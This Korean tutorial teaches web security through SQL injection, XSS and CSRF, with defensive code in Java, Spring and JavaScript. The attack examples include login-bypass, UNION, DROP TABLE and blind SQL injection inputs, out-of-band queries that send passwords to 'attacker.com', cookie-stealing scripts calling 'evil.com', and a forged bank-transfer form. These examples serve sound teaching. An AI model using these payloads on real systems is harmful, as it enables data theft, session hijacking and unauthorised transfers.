# SQL Injection XSS CSRF

- SQL Injection, XSS, CSRF는 OWASP Top 10에 지속적으로 포함되는 대표적인 웹 보안 취약점임.

- 공격: SQL Injection:
  - 대상: 데이터베이스
  - 공격 방식: 악성 SQL 쿼리 삽입
  - 주요 위험: 데이터 유출/수정/삭제
- 공격: XSS:
  - 대상: 사용자 브라우저
  - 공격 방식: 악성 스크립트 삽입
  - 주요 위험: 세션 탈취, 피싱
- 공격: CSRF:
  - 대상: 서버 기능
  - 공격 방식: 인증된 사용자 권한 악용
  - 주요 위험: 비인가 작업 수행

## SQL Injection

### 개념

SQL Injection은 사용자 입력을 SQL 쿼리에 직접 삽입할 때 입력값이 쿼리 구조까지 바꾸는 공격이다. 아래 예제에서는 사용자 이름에 포함된 따옴표와 주석 기호 때문에 비밀번호 검사 부분이 주석으로 처리된다.

```sql
-- 취약한 쿼리
SELECT * FROM users WHERE username = '입력값' AND password = '입력값'

-- 공격 입력: username = "admin'--"
SELECT * FROM users WHERE username = 'admin'--' AND password = '아무거나'
                                        ↑
                                    주석 처리됨 (비밀번호 검증 무시)
```

### SQL Injection 유형

#### Classic SQL Injection (In-band)

```java
// 취약한 코드
public User login(String username, String password) {
    String query = "SELECT * FROM users WHERE username = '" + username
                 + "' AND password = '" + password + "'";
    return jdbcTemplate.queryForObject(query, new UserRowMapper());
}

// 공격 1: 인증 우회
// username: admin'--
// password: anything
// 결과: SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

// 공격 2: UNION 기반 데이터 추출
// username: ' UNION SELECT username, password FROM users--
// 결과: 모든 사용자 정보 노출

// 공격 3: 데이터 삭제
// username: '; DROP TABLE users;--
// 결과: users 테이블 삭제
```

#### Blind SQL Injection

```java
// 에러 메시지가 노출되지 않을 때 사용
// Boolean 기반: 참/거짓 응답의 차이로 정보 추출

// 공격: 첫 글자가 'a'인지 확인
// username: admin' AND SUBSTRING(password,1,1)='a'--
// 응답이 다르면 첫 글자가 'a'임을 알 수 있음

// Time 기반: 응답 시간 차이로 정보 추출
// username: admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
// 5초 지연되면 첫 글자가 'a'임
```

#### Out-of-band SQL Injection

```sql
-- DNS 또는 HTTP 요청을 통해 데이터 추출 (네트워크 접근 가능 시)
-- MySQL
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'));

-- SQL Server
EXEC xp_dirtree '\\attacker.com\' + (SELECT TOP 1 password FROM users);
```

### SQL Injection 방어

#### Prepared Statement (파라미터화된 쿼리)

```java
// 가장 효과적인 방어 - 사용자 입력을 데이터로만 처리

// JDBC
public User login(String username, String password) {
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";

    try (PreparedStatement stmt = connection.prepareStatement(query)) {
        stmt.setString(1, username);  // 문자열로만 처리
        stmt.setString(2, password);

        ResultSet rs = stmt.executeQuery();
        // ...
    }
}

// JdbcTemplate
public User login(String username, String password) {
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";
    return jdbcTemplate.queryForObject(query, new UserRowMapper(), username, password);
}

// MyBatis - #{} 사용 (Prepared Statement)
// 취약: ${} (문자열 연결)
@Select("SELECT * FROM users WHERE username = #{username} AND password = #{password}")
User findUser(@Param("username") String username, @Param("password") String password);
```

#### ORM 사용 (JPA/Hibernate)

```java
// JPA Repository
public interface UserRepository extends JpaRepository<User, Long> {
    // 메서드 이름 쿼리 - 안전
    Optional<User> findByUsernameAndPassword(String username, String password);
}

// JPQL - 파라미터 바인딩 사용
@Query("SELECT u FROM User u WHERE u.username = :username AND u.password = :password")
Optional<User> findUser(@Param("username") String username, @Param("password") String password);

// Native Query도 파라미터 바인딩 사용
@Query(value = "SELECT * FROM users WHERE username = :username", nativeQuery = true)
Optional<User> findByUsernameNative(@Param("username") String username);

// 취약: 동적 쿼리 문자열 연결
// 절대 하지 말 것!
String jpql = "SELECT u FROM User u WHERE u.username = '" + username + "'";
```

#### 입력 검증 (추가 방어)

```java
// 화이트리스트 검증
public void validateInput(String input) {
    // 허용된 문자만 사용
    if (!input.matches("^[a-zA-Z0-9_]+$")) {
        throw new IllegalArgumentException("Invalid characters in input");
    }

    // 길이 제한
    if (input.length() > 50) {
        throw new IllegalArgumentException("Input too long");
    }
}

// 동적 정렬 컬럼 검증
public List<User> findUsers(String sortColumn) {
    // 화이트리스트로 허용된 컬럼만
    Set<String> allowedColumns = Set.of("username", "email", "created_at");

    if (!allowedColumns.contains(sortColumn)) {
        throw new IllegalArgumentException("Invalid sort column");
    }

    // ORDER BY는 파라미터화할 수 없으므로 검증 후 사용
    String query = "SELECT * FROM users ORDER BY " + sortColumn;
    return jdbcTemplate.query(query, new UserRowMapper());
}
```

#### 최소 권한 원칙

```sql
-- 애플리케이션용 DB 계정은 최소 권한만 부여
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- 필요한 테이블에 대해서만 필요한 권한
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'localhost';
GRANT SELECT, INSERT ON mydb.orders TO 'app_user'@'localhost';

-- DROP, ALTER, TRUNCATE 등 위험한 권한은 부여하지 않음
-- GRANT ALL PRIVILEGES 사용 금지
```

## XSS (Cross-Site Scripting)

### 개념

XSS는 웹 페이지에 삽입한 악성 스크립트를 다른 사용자의 브라우저에서 실행하는 공격이다. 아래처럼 사용자 이름을 HTML에 그대로 넣으면, 이름으로 입력한 값이 페이지의 스크립트로 해석될 수 있다.

```html
<!-- 취약한 페이지 -->
<p>안녕하세요, <%= userName %>님!</p>

<!-- 공격자 입력 -->
userName = <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

<!-- 결과 -->
<p>안녕하세요, <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>님!</p>
<!-- 다른 사용자가 이 페이지를 볼 때 쿠키가 탈취됨 -->
```

### XSS 유형

#### Stored XSS (저장형)

Stored XSS에서는 악성 스크립트를 포함한 게시글이나 댓글, 사용자 프로필이 서버 DB에 저장된다. 피해자가 해당 페이지를 열면 저장된 스크립트도 응답에 포함되어 브라우저에서 실행되고, 쿠키 탈취 등의 피해로 이어진다. 같은 내용을 읽는 여러 사용자에게 영향을 줄 수 있어 가장 위험한 유형으로 다룬다.

```java
// 취약한 코드 - 게시글 저장
@PostMapping("/posts")
public Post createPost(@RequestBody PostRequest request) {
    Post post = new Post();
    post.setTitle(request.getTitle());    // 검증 없이 저장
    post.setContent(request.getContent()); // 스크립트 포함 가능
    return postRepository.save(post);
}

// 공격 페이로드
{
  "title": "일반 제목",
  "content": "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"
}
```

#### Reflected XSS (반사형)

Reflected XSS는 악성 입력이 URL 파라미터를 거쳐 응답에 반영되는 방식이다. 피해자가 공격자가 만든 `http://site.com/search?q=...` 링크를 누르면 서버가 `q` 값을 포함한 응답을 반환하고, 그 값이 스크립트로 실행된다. 검색 결과나 오류 메시지를 이용하는 사례가 있으며 피싱에 주로 사용된다.

```java
// 취약한 코드 - 검색 결과 표시
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // 이스케이프 없이 전달
    model.addAttribute("results", searchService.search(q));
    return "search";
}

<!-- 취약한 템플릿 -->
<p>검색어: ${query}에 대한 결과</p>  <!-- XSS 취약 -->
```

#### DOM-based XSS

```javascript
// 취약한 JavaScript 코드
// URL: http://site.com/page#<script>alert('xss')</script>

// 취약: innerHTML에 직접 삽입
const hash = window.location.hash.substring(1);
document.getElementById('content').innerHTML = hash;  // DOM XSS!

// 취약: document.write 사용
document.write(window.location.search);

// 취약: eval 사용
const data = window.location.search.split('=')[1];
eval(data);  // 절대 금지!
```

### XSS 방어

#### 출력 인코딩 (Output Encoding)

```java
// HTML 컨텍스트 인코딩
import org.apache.commons.text.StringEscapeUtils;

public String escapeHtml(String input) {
    return StringEscapeUtils.escapeHtml4(input);
    // < → &lt;
    // > → &gt;
    // & → &amp;
    // " → &quot;
    // ' → &#x27;
}

// Thymeleaf - 기본적으로 이스케이프됨
<p th:text="${userInput}"></p>  <!-- 안전: 자동 이스케이프 -->
<p th:utext="${userInput}"></p> <!-- 위험: 이스케이프 안됨, 필요 시만 사용 -->

// JavaScript 컨텍스트
public String escapeJavaScript(String input) {
    return StringEscapeUtils.escapeEcmaScript(input);
}

// URL 컨텍스트
public String escapeUrl(String input) {
    return URLEncoder.encode(input, StandardCharsets.UTF_8);
}
```

```html
<!-- 컨텍스트별 이스케이프 예시 -->

<!-- HTML 본문 -->
<p>Hello, &lt;script&gt;alert('xss')&lt;/script&gt;</p>

<!-- HTML 속성 -->
<input value="&quot;onclick=&quot;alert('xss')">

<!-- JavaScript 내부 -->
<script>
    var name = "John\x3cscript\x3ealert(\x27xss\x27)\x3c/script\x3e";
</script>

<!-- URL 파라미터 -->
<a href="/search?q=hello%3Cscript%3E">Search</a>
```

#### Content Security Policy (CSP)

```java
// Spring Security CSP 설정
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' https://trusted-cdn.com; " +
                        "style-src 'self' 'unsafe-inline'; " +  // 인라인 스타일 필요 시
                        "img-src 'self' data: https:; " +
                        "font-src 'self' https://fonts.googleapis.com; " +
                        "connect-src 'self' https://api.example.com; " +
                        "frame-ancestors 'none'; " +
                        "form-action 'self'; " +
                        "report-uri /csp-report"
                    )
                )
            );
        return http.build();
    }
}
```

- CSP 지시어:
- default-src: 기본 정책
- script-src: JavaScript 소스
- style-src: CSS 소스
- img-src: 이미지 소스
- connect-src: AJAX, WebSocket 등
- frame-ancestors: iframe 임베딩 허용
- form-action: 폼 제출 대상
- 'self': 동일 출처만
- 'none': 모두 차단
- 'unsafe-inline': 인라인 허용 (가능하면 피함)
- 'unsafe-eval': eval 허용 (금지 권장)
- nonce-xxx: 특정 인라인 스크립트만 허용

#### 입력 검증 및 새니타이징

```java
// HTML Sanitizer 사용 (OWASP Java HTML Sanitizer)
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

@Component
public class HtmlSanitizer {

    // 허용할 HTML 태그 정책
    private final PolicyFactory policy = Sanitizers.FORMATTING
        .and(Sanitizers.LINKS)
        .and(Sanitizers.BLOCKS)
        .and(Sanitizers.IMAGES);

    public String sanitize(String untrustedHtml) {
        return policy.sanitize(untrustedHtml);
        // <script>alert('xss')</script> → 제거됨
        // <b>Bold</b> → 유지됨
        // <a href="...">Link</a> → 유지됨
    }
}

// 사용 예시
@PostMapping("/posts")
public Post createPost(@RequestBody PostRequest request) {
    Post post = new Post();
    post.setTitle(htmlSanitizer.sanitize(request.getTitle()));
    post.setContent(htmlSanitizer.sanitize(request.getContent()));
    return postRepository.save(post);
}
```

#### DOM XSS 방어

```javascript
// 안전한 DOM 조작

// 취약: innerHTML
element.innerHTML = userInput;  // XSS!

// 안전: textContent (텍스트로만 처리)
element.textContent = userInput;  // 안전

// 안전: createElement + textContent
const link = document.createElement('a');
link.textContent = userInput;
link.href = sanitizeUrl(userInput);  // URL도 검증
element.appendChild(link);

// URL 검증
function sanitizeUrl(url) {
    try {
        const parsed = new URL(url);
        // http, https만 허용
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            return '#';
        }
        return parsed.href;
    } catch {
        return '#';
    }
}

// javascript: 프로토콜 차단
// <a href="javascript:alert('xss')">Click</a>
```

## CSRF (Cross-Site Request Forgery)

### 개념

CSRF는 인증된 사용자가 자신도 모르게 공격자가 원하는 요청을 보내게 하는 공격이다. 예를 들어 `bank.com`에 로그인한 피해자가 `evil.com`을 방문하면, 공격자 페이지가 이체 폼을 자동 제출할 수 있다.

이 폼은 `bank.com/transfer`로 공격자 계좌와 금액 `1000000`을 POST한다. 요청에 피해자의 세션 쿠키가 포함되고 서버가 이를 그대로 신뢰하면, 피해자가 의도하지 않은 이체가 실행된다. 다음 예제는 이런 요청을 만드는 폼과 이미지, AJAX 방식을 보여준다.

### CSRF 공격 예시

```html
<!-- 공격자 사이트의 악성 페이지 -->

<!-- 1. 자동 제출 폼 -->
<form id="evil-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('evil-form').submit();</script>

<!-- 2. 이미지 태그 (GET 요청) -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" style="display:none">

<!-- 3. AJAX (CORS 허용 시) -->
<script>
fetch('https://api.bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({to: 'attacker', amount: 1000000})
});
</script>
```

### CSRF 방어

#### CSRF 토큰

```java
// Spring Security - 기본적으로 CSRF 보호 활성화
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                // 세션에 CSRF 토큰 저장 (기본값)
                .csrfTokenRepository(HttpSessionCsrfTokenRepository)

                // 또는 쿠키에 저장 (SPA 용)
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())

                // 특정 경로 제외
                .ignoringRequestMatchers("/api/webhook/**")
            );
        return http.build();
    }
}

// Thymeleaf 폼에 자동 포함
<form th:action="@{/transfer}" method="post">
    <!-- Thymeleaf가 자동으로 CSRF 토큰 추가 -->
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}">
    ...
</form>

// 또는 간단하게
<form th:action="@{/transfer}" method="post">
    <!-- th:action 사용 시 자동 포함 -->
    ...
</form>
```

```javascript
// SPA에서 CSRF 토큰 사용

// 1. 메타 태그에서 읽기
const token = document.querySelector('meta[name="_csrf"]').getAttribute('content');
const header = document.querySelector('meta[name="_csrf_header"]').getAttribute('content');

// 2. 요청에 포함
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        [header]: token  // X-CSRF-TOKEN: <token>
    },
    body: JSON.stringify(data)
});

// Axios 글로벌 설정
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';
```

#### SameSite 쿠키

```java
// 세션 쿠키에 SameSite 속성 설정
@Configuration
public class SessionConfig {

    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setSameSite("Strict");  // 동일 사이트 요청만
        // 또는 "Lax" - 안전한 최상위 네비게이션에서만
        serializer.setUseSecureCookie(true);
        return serializer;
    }
}
```

- SameSite 값:
- Strict: 동일 사이트 요청에서만 쿠키 전송 (가장 안전)
- Lax: 안전한 HTTP 메서드의 최상위 네비게이션에서만 전송 (기본값)
- None: 모든 요청에서 전송 (Secure 필수, CSRF에 취약)

#### Origin/Referer 검증

```java
@Component
public class CsrfOriginFilter extends OncePerRequestFilter {

    private static final Set<String> ALLOWED_ORIGINS = Set.of(
        "https://app.example.com",
        "https://admin.example.com"
    );

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain)
            throws ServletException, IOException {

        // GET, HEAD, OPTIONS, TRACE는 제외
        if (!isModifyingRequest(request.getMethod())) {
            filterChain.doFilter(request, response);
            return;
        }

        String origin = request.getHeader("Origin");
        String referer = request.getHeader("Referer");

        // Origin 또는 Referer 검증
        if (origin != null) {
            if (!ALLOWED_ORIGINS.contains(origin)) {
                response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid Origin");
                return;
            }
        } else if (referer != null) {
            try {
                URL refererUrl = new URL(referer);
                String refererOrigin = refererUrl.getProtocol() + "://" + refererUrl.getHost();
                if (!ALLOWED_ORIGINS.contains(refererOrigin)) {
                    response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid Referer");
                    return;
                }
            } catch (MalformedURLException e) {
                response.sendError(HttpServletResponse.SC_FORBIDDEN, "Invalid Referer");
                return;
            }
        }
        // Origin과 Referer 모두 없으면 허용 (레거시 클라이언트 호환)
        // 또는 차단할 수도 있음

        filterChain.doFilter(request, response);
    }

    private boolean isModifyingRequest(String method) {
        return Set.of("POST", "PUT", "DELETE", "PATCH").contains(method);
    }
}
```

#### Double Submit Cookie

```java
// CSRF 토큰을 쿠키와 요청 파라미터/헤더 모두에 포함
// 두 값이 일치하는지 확인

@Component
public class DoubleSubmitCsrfFilter extends OncePerRequestFilter {

    private static final String CSRF_COOKIE_NAME = "CSRF-TOKEN";
    private static final String CSRF_HEADER_NAME = "X-CSRF-TOKEN";

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain)
            throws ServletException, IOException {

        if (!isModifyingRequest(request.getMethod())) {
            filterChain.doFilter(request, response);
            return;
        }

        String cookieToken = getCsrfCookie(request);
        String headerToken = request.getHeader(CSRF_HEADER_NAME);

        if (cookieToken == null || !cookieToken.equals(headerToken)) {
            response.sendError(HttpServletResponse.SC_FORBIDDEN, "CSRF token mismatch");
            return;
        }

        filterChain.doFilter(request, response);
    }

    private String getCsrfCookie(HttpServletRequest request) {
        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (CSRF_COOKIE_NAME.equals(cookie.getName())) {
                    return cookie.getValue();
                }
            }
        }
        return null;
    }
}
```

## 종합 방어 전략

### 다층 방어 (Defense in Depth)

요청이 들어와 응답으로 나가기까지 각 계층에서 서로 다른 위험을 다룬다. WAF는 알려진 공격 패턴과 요청 속도를 제한하고, 입력 검증 계층은 허용 값과 길이, 형식을 확인한다. 비즈니스 로직에서는 Prepared Statement, CSRF 토큰 검증, 권한 검증을 적용한다.

응답을 만들 때는 출력 위치에 맞춰 HTML 이스케이프, JSON 인코딩, URL 인코딩을 사용한다. 여기에 `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security` 같은 HTTP 보안 헤더를 함께 설정한다.

### Spring Security 종합 설정

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // CSRF 보호
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )

            // 보안 헤더
            .headers(headers -> headers
                // XSS 필터
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
                )
                // Content-Type 스니핑 방지
                .contentTypeOptions(Customizer.withDefaults())
                // 클릭재킹 방지
                .frameOptions(frame -> frame.deny())
                // HTTPS 강제
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                )
                // CSP
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self'; " +
                        "frame-ancestors 'none'"
                    )
                )
                // Referrer 정책
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )
            );

        return http.build();
    }
}
```

## 참고 자료

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## 관련 학습

- [CORS](02-CORS.md)
